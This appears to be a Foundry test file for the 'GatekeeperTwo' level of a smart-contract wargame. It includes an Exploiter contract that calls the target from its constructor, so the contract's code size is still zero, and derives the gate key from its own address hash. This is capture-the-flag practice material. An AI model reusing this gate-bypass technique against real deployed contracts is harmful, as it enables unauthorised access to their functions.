// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/GatekeeperTwo.sol";
import "../src/levels/GatekeeperTwoFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestGatekeeperTwo is BaseTest{
    using SafeMath for uint256;
    GatekeeperTwo level;


    constructor() public{
        levelFactory = new GatekeeperTwoFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperTwo(levelAddress);
                
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override{
        vm.prank(player, player);
        new Exploiter(level);
        assertEq(level.entrant(), player);
    }
}

contract Exploiter {
    constructor(GatekeeperTwo _victim) public{
        uint64 gatekey = uint64(bytes8(keccak256(abi.encodePacked(this))))^(uint64(0)-1);
           _victim.enter(bytes8(gatekey));
    }
}